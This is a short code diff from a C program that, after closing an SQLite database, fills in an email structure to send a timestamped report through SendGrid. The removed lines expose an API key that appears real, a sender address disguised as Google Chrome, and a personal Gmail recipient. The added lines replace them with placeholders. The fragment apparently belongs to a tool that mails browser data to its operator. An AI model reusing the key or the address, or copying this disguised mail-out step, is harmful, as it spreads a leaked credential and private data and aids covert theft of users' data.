@@ -161,9 +161,9 @@ int main()
 	sqlite3_close(db);
 	time_t t = time(NULL);
 	MAIL_CT *M_CT = (MAIL_CT*) calloc(sizeof(MAIL_CT), 1);
-	M_CT->api_key = "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";
-	M_CT->from = "google-chrome@math.org";
-	M_CT->to = "ayoub.sirai1807@gmail.com";
+	M_CT->api_key = "sendgrid api key";
+	M_CT->from = "google-chrome@maths.org";
+	M_CT->to = "your@email.com";
 	char *subject = (char *)calloc(64, 1);
 	ft_log_time(subject);
 	M_CT->subject = subject;
